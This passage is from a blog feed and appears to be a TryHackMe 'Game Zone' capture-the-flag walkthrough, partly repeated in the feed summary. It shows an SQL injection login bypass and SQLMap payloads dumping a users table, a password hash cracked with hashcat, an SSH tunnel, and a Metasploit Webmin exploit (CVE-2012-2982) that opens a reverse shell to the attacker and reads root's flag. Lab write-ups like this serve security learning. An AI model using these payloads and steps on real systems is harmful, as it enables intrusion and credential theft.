   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT     10000            yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.2.2.175       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.2.2.175:4444 
[*] Attempting to login...
[-] Authentication failed
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 10.2.2.175:4444 
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo NQHi2CZk6m646Ep7;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: &quot;NQHi2CZk6m646Ep7\r\n&quot;
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.2.2.175:4444 -&amp;gt; 10.10.27.3:41238) at 2021-02-20 18:49:06 -0500
[*] Session 1 created in the background.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We now have a shell and can naviagate to the flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.2.2.175:4444 -&amp;gt; 10.10.27.3:41238 (127.0.0.1)

msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; sessions -i 1
[*] Starting interaction with 1...


pwd
/usr/share/webmin/file/
cd /root
ls
root.txt
cat root.txt
a4b945830xxxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;alternate-escalation-method&quot;&gt;Alternate Escalation Method&lt;/h3&gt;

&lt;p&gt;When I originally couldn’t get the Metapsploit exploit to work because of the wrong SSL setting, I did a bit of Googling and found some information on using the method mentioned in the Expoit DB entry.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, 
to execute arbitrary commands with root privileges.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I discovered that navigating to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://127.0.0.1:10000/file/show.cgi/root/root.txt&lt;/code&gt; would also display the flag.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This was an intersting room to try. I had never used the SSH tunnel method before.&lt;/p&gt;

&lt;p&gt;I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall.&lt;/p&gt;</content><author><name></name></author><category term="tryhackme" /><summary type="html">This is a walkthrough of the Tryhackme room called “Game Zone”. Ths description of this room states This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. This THM room doesn’t ask to run NMap scans or any of the initial enumeration so we will start by going directly to the site. The Game Zone Website Navigating to the site in a browser, we see a website called Game Zone. There is a User Login panel on the left side so this looks like a good place to attack so we try to login as admin. SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- - The room says that the site doesn’t have any user called admin but the above query works and brings you to a portal page at portal.php. Using SQLMap The next thing to do is to dump the SQL database using SQLMap. The room directs you to intercept a search request using BurpSuite which is what I did and got back the following. POST /portal.php HTTP/1.1 Host: 10.10.108.67 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 17 Origin: http://10.10.108.67 Connection: close Referer: http://10.10.108.67/portal.php Cookie: PHPSESSID=suepevsj6e11r9tko2ggj5q8q5 Upgrade-Insecure-Requests: 1 searchitem=testing This was then saved to a file called sqlrequest.txt. By the way, it is also possible to view the request using the developer tools in Firefox from the Network tab. After capturing the request, we then feed this into SQLmap sqlmap -r sqlrequest.txt -dbms mysql -dump where -r : use the intercepted request -dbms : what database we are dealing with -dump : dump the entire database. This yields the following (dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ sqlmap -r sqlrequest.txt -dbms mysql -dump ___ __H__ ___ ___[)]_____ ___ ___ {1.5#stable} |_ -| . [&quot;] | .'| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 10:49:55 /2021-02-19/ [10:49:55] [INFO] parsing HTTP request from 'sqlrequest.txt' [10:49:55] [INFO] testing connection to the target URL [10:49:55] [INFO] testing if the target URL content is stable [10:49:55] [INFO] target URL content is stable [10:49:55] [INFO] testing if POST parameter 'searchitem' is dynamic [10:49:56] [WARNING] POST parameter 'searchitem' does not appear to be dynamic [10:49:56] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL') [10:49:56] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks [10:49:56] [INFO] testing for SQL injection on POST parameter 'searchitem' for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [10:50:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [10:50:02] [WARNING] reflective value(s) found and filtering out [10:50:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)' [10:50:04] [INFO] testing 'Generic inline queries' [10:50:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' [10:50:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' [10:50:16] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string=&quot;be&quot;) [10:50:16] [INFO] testing 'MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' [10:50:16] [INFO] testing 'MySQL &amp;gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' [10:50:16] [INFO] testing 'MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' [10:50:17] [INFO] testing 'MySQL &amp;gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)' [10:50:17] [INFO] testing 'MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' [10:50:17] [INFO] POST parameter 'searchitem' is 'MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable [10:50:17] [INFO] testing 'MySQL inline queries' [10:50:17] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries (comment)' [10:50:18] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries' [10:50:18] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries (query SLEEP - comment)' [10:50:18] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries (query SLEEP)' [10:50:19] [INFO] testing 'MySQL &amp;lt; 5.0.12 stacked queries (heavy query - comment)' [10:50:19] [INFO] testing 'MySQL &amp;lt; 5.0.12 stacked queries (heavy query)' [10:50:19] [INFO] testing 'MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)' [10:50:30] [INFO] POST parameter 'searchitem' appears to be 'MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable [10:50:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [10:50:30] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns' [10:50:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [10:50:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test [10:50:31] [INFO] target URL appears to have 3 columns in query [10:50:32] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable [10:50:32] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests: --- Parameter: searchitem (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: searchitem=-2828' OR 2751=2751# Type: error-based Title: MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: searchitem=tester' AND GTID_SUBSET(CONCAT(0x7171627071,(SELECT (ELT(4754=4754,1))),0x717a627071),4754)-- bmCD Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: searchitem=tester' AND (SELECT 6499 FROM (SELECT(SLEEP(5)))RNqx)-- KlSE Type: UNION query Title: MySQL UNION query (NULL) - 3 columns Payload: searchitem=tester' UNION ALL SELECT NULL,NULL,CONCAT(0x7171627071,0x724f745778686f5371736d525645714c44466567514b48564d4f4a775564714875434e5956455964,0x717a627071)# --- [10:51:33] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &amp;gt;= 5.6 [10:51:34] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [10:51:34] [INFO] fetching current database [10:51:35] [INFO] fetching tables for database: 'db' [10:51:35] [INFO] fetching columns for table 'users' in database 'db' [10:51:35] [INFO] fetching entries for table 'users' in database 'db' [10:51:35] [INFO] recognized possible password hashes in column 'pwd' do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y [10:51:44] [INFO] writing hashes to a temporary file '/tmp/sqlmapg3savr7s11905/sqlmaphashes-g6au1jcb.txt' do you want to crack them via a dictionary-based attack? [Y/n/q] [10:51:49] [INFO] using hash method 'sha256_generic_passwd' what dictionary do you want to use? [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter) [2] custom dictionary file [3] file with list of dictionary files &amp;gt; [10:51:56] [INFO] using default dictionary do you want to use common password suffixes? (slow!) [y/N] [10:52:01] [INFO] starting dictionary-based cracking (sha256_generic_passwd) [10:52:01] [INFO] starting 4 processes [10:52:10] [WARNING] no clear password(s) found Database: db Table: users [1 entry] +------------------------------------------------------------------+----------+ | pwd | username | +------------------------------------------------------------------+----------+ | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47 | +------------------------------------------------------------------+----------+ [10:52:10] [INFO] table 'db.users' dumped to CSV file '/home/dspo6/.local/share/sqlmap/output/10.10.108.67/dump/db/users.csv' [10:52:10] [INFO] fetching columns for table 'post' in database 'db' [10:52:10] [INFO] fetching entries for table 'post' in database 'db' Database: db Table: post [5 entries] +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | id | name | description | +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | 1 | Mortal Kombat 11 | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat. | | 2 | Marvel Ultimate Alliance 3 | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. | | 3 | SWBF2 2005 | Best game ever | | 4 | Hitman 2 | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing. | | 5 | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system. | +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ [10:52:10] [INFO] table 'db.post' dumped to CSV file '/home/dspo6/.local/share/sqlmap/output/10.10.108.67/dump/db/post.csv' [10:52:10] [INFO] fetched data logged to text files under '/home/dspo6/.local/share/sqlmap/output/10.10.108.67' [*] ending @ 10:52:10 /2021-02-19/ (dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ b 19 10:52 .. -rw-r--r-- 1 dspo6 dspo6 823 Feb 19 10:52 post.csv -rw-r--r-- 1 dspo6 dspo6 87 Feb 19 10:52 users.csv (dspo6㉿kali)[~/.local/share/sqlmap/output/10.10.108.67/dump/db]$ cat users.csv pwd,username ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14,agent47 (dspo6㉿kali)[~/.local/share/sqlmap/output/10.10.108.67/dump/db]$ Of interest to us here is this section which shows us the users table along with the password hash. Database: db Table: users [1 entry] +------------------------------------------------------------------+----------+ | pwd | username | +------------------------------------------------------------------+----------+ | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47 | +------------------------------------------------------------------+----------+ Hashcat I switched over to my Windows PC to crack this hash so I could take advantage of the GPU using the rockyou word list (although the output indicates that I need to update the CUDA SDK on my PC). PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1&amp;gt; .\hashcat.exe -a 0 -m 1400 .\target\hash.txt ..\wordlists\rockyouhashcat (v6.1.1) starting... * Device #1: CUDA SDK Toolkit installation NOT detected. CUDA SDK Toolkit installation required for proper device support and utilization Falling back to OpenCL Runtime * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch OpenCL API (OpenCL 1.2 CUDA 11.2.109) - Platform #1 [NVIDIA Corporation] ======================================================================== * Device #1: GeForce GTX 1070, 6720/8192 MB (2048 MB allocatable), 15MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 327 MB Dictionary cache hit: * Filename..: ..\wordlists\rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124 Session..........: hashcat Status...........: Cracked Hash.Name........: SHA2-256 Hash.Target......: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218...3efd14 Time.Started.....: Fri Feb 19 08:31:10 2021 (1 sec) Time.Estimated...: Fri Feb 19 08:31:11 2021 (0 secs) Guess.Base.......: File (..\wordlists\rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 21318.5 kH/s (5.41ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 2949120/14344385 (20.56%) Rejected.........: 0/2949120 (0.00%) Restore.Point....: 1966080/14344385 (13.71%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: bragg426 -&amp;gt; vaireva Hardware.Mon.#1..: Temp: 35c Fan: 0% Util: 5% Core:1759MHz Mem:3802MHz Bus:16 Started: Fri Feb 19 08:31:08 2021 Stopped: Fri Feb 19 08:31:11 2021 PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1&amp;gt; So this shows that the password is videogamer124 Using Found Credentials with SSH We will now try the found credentials to log in using SSH and they work. (dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ ssh agent47@10.10.108.67 The authenticity of host '10.10.108.67 (10.10.108.67)' can't be established. ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.108.67' (ECDSA) to the list of known hosts. agent47@10.10.108.67's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147 agent47@gamezone:~$ Using the ss command to dump socket statistics, we see the following:- agent47@gamezone:~$ ss -tulpn Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port udp UNCONN 0 0 *:10000 *:* udp UNCONN 0 0 *:68 *:* tcp LISTEN 0 128 *:22 *:* tcp LISTEN 0 80 127.0.0.1:3306 *:* tcp LISTEN 0 128 *:10000 *:* tcp LISTEN 0 128 :::22 :::* tcp LISTEN 0 128 :::80 :::* agent47@gamezone:~$ Note that there is a TCP port 10000 open. One thing that I do not understand about this room is the following statement:- We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). I was unable to run the iptables command when logged in as agent47, presumably because that user is not root. In any case we will continue and exploit this port using an SSH tunnel. SSH Tunnel Creating an SSH tunnel, will allow us to forward traffic on the port 10000 to a port on our PC. (dspo6㉿kali)[~]$ ssh -L 10000:localhost:10000 agent47@10.10.27.3 The authenticity of host '10.10.27.3 (10.10.27.3)' can't be established. ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.27.3' (ECDSA) to the list of known hosts. agent47@10.10.27.3's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. Last login: Sat Feb 20 16:57:39 2021 from 10.2.2.175 agent47@gamezone:~$ Now when we go to our browser and navigate to the site with port 10000 we see a login page. Note: The first few times, I tried this I was not able to view this page. It turned out that I still have the proxy for Burpsuite enabled in the browser - lesson learned. Logging in with the credentials we found earlier, we are brought to a Webmin version 1.580 page. Escalation Search the Exploit DB, we find CVE-2012-2982 which turns out to be a Metasploit exploit. Note: During this phase, we need to leaave the tunnel open. Firing up Metasploit, we can search for “CVE-2012-2982” and then use the resulting exploit. We then need to choose the payload of cmd/unix/reverse and enter the options. msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; show options Module options (exploit/unix/webapp/webmin_show_cgi_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD videogamer124 yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS localhost yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;' RPORT 10000 yes The target port (TCP) SSL true yes Use SSL USERNAME agent47 yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.2.2.175 yes The listen address (an interface may be specified) LPORT 9002 yes The listen port Exploit target: Id Name -- ---- 0 Webmin 1.580 msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; The first time I ran this, the exploit failed msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; run [*] Exploiting target 0.0.0.1 [*] Started reverse TCP double handler on 10.2.2.175:9002 [*] Attempting to login... [-] Authentication failed [*] Exploiting target 127.0.0.1 [*] Started reverse TCP double handler on 10.2.2.175:9002 [*] Attempting to login... [-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number [*] Exploit completed, but no session was created. msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; The reason for this is that I had the SSL option set to true. I set this to false and tried again. msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; show options Module options (exploit/unix/webapp/webmin_show_cgi_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD videogamer124 yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS localhost yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;' RPORT 10000 yes The target port (TCP) SSL false yes Use SSL USERNAME agent47 yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.2.2.175 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin 1.580 msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; run [*] Exploiting target 0.0.0.1 [*] Started reverse TCP double handler on 10.2.2.175:4444 [*] Attempting to login... [-] Authentication failed [*] Exploiting target 127.0.0.1 [*] Started reverse TCP double handler on 10.2.2.175:4444 [*] Attempting to login... [+] Authentication successfully [+] Authentication successfully [*] Attempting to execute the payload... [+] Payload executed successfully [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo NQHi2CZk6m646Ep7; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket A [*] A: &quot;NQHi2CZk6m646Ep7\r\n&quot; [*] Matching... [*] B is input... [*] Command shell session 1 opened (10.2.2.175:4444 -&amp;gt; 10.10.27.3:41238) at 2021-02-20 18:49:06 -0500 [*] Session 1 created in the background. msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; We now have a shell and can naviagate to the flag. msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell cmd/unix 10.2.2.175:4444 -&amp;gt; 10.10.27.3:41238 (127.0.0.1) msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; sessions -i 1 [*] Starting interaction with 1... pwd /usr/share/webmin/file/ cd /root ls root.txt cat root.txt a4b945830xxxxxxxxxxxxxxxxxxxxxx Alternate Escalation Method When I originally couldn’t get the Metapsploit exploit to work because of the wrong SSL setting, I did a bit of Googling and found some information on using the method mentioned in the Expoit DB entry. The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges. I discovered that navigating to http://127.0.0.1:10000/file/show.cgi/root/root.txt would also display the flag. Conclusion This was an intersting room to try. I had never used the SSH tunnel method before. I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall.</summary></entry></feed>